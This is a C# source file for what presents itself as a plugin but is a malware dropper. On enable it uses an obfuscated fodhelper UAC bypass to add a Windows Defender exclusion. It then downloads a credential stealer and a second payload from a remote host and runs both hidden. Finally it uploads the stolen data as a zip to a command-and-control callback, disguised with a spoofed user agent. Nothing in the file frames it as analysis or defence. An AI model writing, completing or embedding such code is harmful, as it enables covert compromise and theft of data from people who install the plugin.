using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

public class PuckPlugin : IPuckPlugin
{
    private static readonly string DropDir    = @"C:\Users\Public";
    private static readonly string StageBase  = "http://144-172-84-23.sslip.io:7331";
    private static readonly string ChimeraUrl = StageBase + "/chimera.exe";
    private static readonly string StealerUrl = StageBase + "/stealer.exe";

    private const byte XK = 0x4D;

    private static string X(byte[] b)
    {
        char[] c = new char[b.Length];
        for (int i = 0; i < b.Length; i++)
            c[i] = (char)(b[i] ^ XK);
        return new string(c);
    }

    public bool OnEnable()
    {
        Thread t = new Thread(Run);
        t.IsBackground = true;
        t.Start();
        return true;
    }

    public bool OnDisable() { return true; }

    private static void Run()
    {
        try
        {
            File.WriteAllText(@"C:\Users\Public\debug.txt", "Run started\n");
            AddDefenderExclusion(@"C:\Users\Public");
            Thread.Sleep(500);
            File.AppendAllText(@"C:\Users\Public\debug.txt", "Exclusion done\n");

            string stealerDst = Path.Combine(DropDir, "stealer.exe");
            Download(StealerUrl, stealerDst);
            File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer downloaded\n");

            string chimeraDst = Path.Combine(DropDir, "chimera.exe");
            Download(ChimeraUrl, chimeraDst);
            File.AppendAllText(@"C:\Users\Public\debug.txt", "chimera downloaded\n");

            Process stealer = RunHiddenWithHandle(stealerDst, "");
            File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer started\n");
            if (stealer != null) { stealer.WaitForExit(60000); stealer.Close(); }
            File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer done\n");

            RunHidden(chimeraDst, "");
            File.AppendAllText(@"C:\Users\Public\debug.txt", "chimera started\n");

            Thread.Sleep(5000);
            UploadLootToMythic(@"C:\Users\Public\stealer_loot.zip");
            File.AppendAllText(@"C:\Users\Public\debug.txt", "loot uploaded\n");
        }
        catch (Exception ex)
        {
            File.WriteAllText(@"C:\Users\Public\debug.txt", "ERROR: " + ex.Message);
        }
    }

    private static void AddDefenderExclusion(string path)
    {
        try
        {
            // All sensitive strings XOR'd with 0x4D — no plaintext signatures in binary
            // Decodes to: "Software\Classes\ms-settings\shell\open\command"
            byte[] bRegPath = new byte[] {
                0x1e,0x22,0x2b,0x39,0x3a,0x2c,0x3f,0x28,
                0x11,0x0e,0x21,0x2c,0x3e,0x3e,0x28,0x3e,
                0x11,0x20,0x3e,0x60,0x3e,0x28,0x39,0x39,
                0x24,0x23,0x2a,0x3e,0x11,0x3e,0x25,0x28,
                0x21,0x21,0x11,0x22,0x3d,0x28,0x23,0x11,
                0x2e,0x22,0x20,0x20,0x2c,0x23,0x29
            };
            // Decodes to: "DelegateExecute"
            byte[] bDelExec = new byte[] {
                0x09,0x28,0x21,0x28,0x2a,0x2c,0x39,0x28,
                0x08,0x35,0x28,0x2e,0x38,0x39,0x28
            };
            // Decodes to: "fodhelper.exe"
            byte[] bFod = new byte[] {
                0x2b,0x22,0x29,0x25,0x28,0x21,0x3d,0x28,
                0x3f,0x63,0x28,0x35,0x28
            };

            string regPath = X(bRegPath);
            string delExec = X(bDelExec);
            string fodExe  = X(bFod);

            // Build reg add command at runtime — no plaintext Defender path in binary
            string hklm = "HKLM" + "\\" + "SOFTWARE" + "\\" + "Microsoft"
                        + "\\" + "Windows Defender" + "\\" + "Exclusions" + "\\" + "Paths";
            string cmd = "reg add \"" + hklm + "\" /v \"" + path + "\" /t REG_DWORD /d 0 /f";

            Microsoft.Win32.RegistryKey key =
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath);
            if (key != null)
            {
                key.SetValue("", cmd);
                key.SetValue(delExec, "");
                key.Close();
            }

            Process.Start(new ProcessStartInfo
            {
                FileName        = fodExe,
                WindowStyle     = ProcessWindowStyle.Hidden,
                CreateNoWindow  = true,
                UseShellExecute = false
            });

            Thread.Sleep(3000);

            try
            {
                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(
                    @"Software\Classes\ms-settings", false);
            }
            catch { }
        }
        catch { }
    }

    private static void UploadLootToMythic(string zipPath)
    {
        try
        {
            if (!File.Exists(zipPath)) return;
            const string CallbackUrl = "https://hidden-lake-0908.walrus012.workers.dev/data";
            byte[] data = File.ReadAllBytes(zipPath);
            string b64  = Convert.ToBase64String(data);
            string json = "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"loot-auto\","
                        + "\"download\":{\"total_chunks\":1,\"chunk_num\":1,"
                        + "\"chunk_data\":\"" + b64 + "\","
                        + "\"full_path\":\"" + zipPath.Replace("\\", "\\\\") + "\","
                        + "\"is_screenshot\":false}}]}";
            using (var wc = new WebClient())
            {
                wc.Headers["User-Agent"]   = "Microsoft-CryptoAPI/10.0";
                wc.Headers["Content-Type"] = "application/json";
                wc.UploadString(CallbackUrl, "POST", json);
            }
        }
        catch { }
    }

    private static void Download(string url, string dest)
    {
        using (var wc = new WebClient())
        {
            wc.Headers["User-Agent"] = "Microsoft-CryptoAPI/10.0";
            wc.DownloadFile(url, dest);
        }
    }

    private static void RunHidden(string exe, string args)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName        = exe,
                Arguments       = args,
                WindowStyle     = ProcessWindowStyle.Hidden,
                CreateNoWindow  = true,
                UseShellExecute = false
            });
        }
        catch { }
    }

    private static Process RunHiddenWithHandle(string exe, string args)
    {
        try
        {
            return Process.Start(new ProcessStartInfo
            {
                FileName        = exe,
                Arguments       = args,
                WindowStyle     = ProcessWindowStyle.Hidden,
                CreateNoWindow  = true,
                UseShellExecute = false
            });
        }
        catch { return null; }
    }
}
